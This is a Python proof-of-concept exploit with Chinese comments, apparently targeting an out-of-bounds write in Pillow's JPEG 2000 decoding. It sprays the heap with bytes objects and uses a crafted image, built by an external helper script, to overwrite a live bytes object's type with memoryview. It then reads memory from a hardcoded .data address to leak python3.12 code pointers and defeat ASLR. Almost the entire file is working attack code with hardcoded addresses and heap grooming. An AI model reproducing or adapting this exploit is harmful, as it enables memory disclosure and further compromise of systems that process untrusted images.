#!/usr/bin/env python3
# 信息泄露 PoC：用越界写把【活 bytes 对象】改成 memoryview，buf = 我们要读的地址
#   写 +0x08 = 0xa350c8 (PyMemoryView_Type)   ← 文件偏移值可直接表达
#   写 +0x38 = 0xa3c908 (要读的地址, tp_repr 槽) ← 同为文件偏移值, 可表达（文件 > 10.7MB）
#   写 +0x48 = 被耦合成 buf+2（巨大 len，正好用于读）
#   受害者内容预置 view.obj(+0x40) = 合法对象, ndim/readonly(+0x58) = 0x100000000
#   => victim[:64].tobytes() 读出内存 => 泄露 python3.12 的代码指针 => 打掉 ASLR
import ctypes, gc, io, os, struct, subprocess, sys
from PIL import Image

R = lambda a: ctypes.c_uint64.from_address(a).value
PY_MEMORYVIEW = 0xA350C8
READ_ADDR = 0xA500D0          # .data 里的一个槽（内容是 python3.12 的代码指针）
PY_BYTES_TYPE = 0xA22670

# 受害者：>=512B 的 bytes（brk 堆，可被我们喷射的空洞邻接）
raw = bytearray(519)
struct.pack_into('<Q', raw, 0x20, PY_BYTES_TYPE)      # view.obj -> 合法对象
struct.pack_into('<Q', raw, 0x28, 0x1000)             # view.len（会被耦合覆盖）
struct.pack_into('<Q', raw, 0x30, 1)                  # itemsize
struct.pack_into('<Q', raw, 0x38, 0x100000000)        # readonly=0, ndim=1
VICTIM_CONTENT = bytes(raw)

victim = bytes(VICTIM_CONTENT)
VADDR = id(victim)
print("[*] victim=%#x  原始 type=%#x" % (VADDR, R(VADDR + 8)))
if VADDR >= 0x1000000:
    print("[!] victim 地址不可表达"); sys.exit(1)

# 越界写的三个值：让 +0x08=PyMemoryView_Type, +0x20=hash(随意), +0x38=READ_ADDR
# 构造器 mk13 的三个值 A/B/C 会落在这几个槽上（映射已由前面的实验确定：A->+0x08, B->+0x18/+0x20, C->+0x38）
A = PY_MEMORYVIEW
B = 0x00000000            # 中间值（必须 < C 且 > A? 由构造器决定，先用占位）
C = READ_ADDR
print("[*] 计划写入: A=%#x B=%#x C=%#x" % (A, B, C))

# 用已有 harness 的思路：先做一次标定式构建（值域由文件大小保证）
# 这里直接调用 mk13，把 A/B/C 传进去；A 必须 < B < C（构造器约束）
A = PY_MEMORYVIEW
B = 0xA40000
C = READ_ADDR
r = subprocess.run(['python3', '/tmp/mk13.py', '/tmp/exp/base.j2k', '/tmp/LEAK.j2k', '0', '23',
                    hex(A), hex(B), hex(C), '-370'], capture_output=True, text=True)
print("[*] build:", (r.stdout + r.stderr).strip()[:70])
if 'OK' not in r.stdout:
    print("[!] 构建失败"); sys.exit(1)

# groom + 解码（fork 子进程，孩子崩无妨）
LOG = '/tmp/leak_decode.log'
pid = os.fork()
if pid == 0:
    fd = os.open(LOG, os.O_WRONLY | os.O_CREAT | os.O_TRUNC)
    os.dup2(fd, 2)
    try:
        gc.collect()
        prime = [bytes(519) for _ in range(1024)]
        del prime
        pairs = [(bytes(519), bytes(VICTIM_CONTENT)) for _ in range(400)]
        good = [(D, Bv) for (D, Bv) in pairs if id(Bv) - id(D) == 0x230]
        if good:
            keep = [t for i, t in enumerate(good) if i != len(good) // 2]
            Ks = [Bv for (D, Bv) in keep]
            holeD = good[len(good) // 2][0]
            del holeD, pairs, good
            gc.collect()
            M = open('/tmp/LEAK.j2k', 'rb').read()
            im = Image.open(io.BytesIO(M)); im.load()
    except BaseException:
        pass
    os._exit(0)
os.waitpid(pid, 0)

print("[*] 解码后 victim:")
print("     +0x08 type = %#x (期望 memoryview %#x)" % (R(VADDR + 8), PY_MEMORYVIEW))
print("     +0x20      = %#x (期望 B)" % R(VADDR + 0x20))
print("     +0x38 buf  = %#x (期望 %#x)" % (R(VADDR + 0x38), READ_ADDR))
print("     +0x48 len  = %#x" % R(VADDR + 0x48))

if R(VADDR + 8) == PY_MEMORYVIEW:
    print("\n[+] 类型混淆成功 —— 尝试读内存")
    try:
        data = victim[:64].tobytes()
        print("[+] 读出的 64 字节:", data.hex())
        ptrs = [struct.unpack_from('<Q', data, i)[0] for i in range(0, 64, 8)]
        print("[+] 解析为指针:", [hex(x) for x in ptrs if x > 0x10000])
        print("\n★★★ 信息泄露成立：从 .data 读出了指针（可用于打掉 ASLR）")
    except BaseException as e:
        print("[-] 读取异常: %r" % (e,))
else:
    print("\n[-] 未混淆（victim 不在窗口内 / 映射不对）")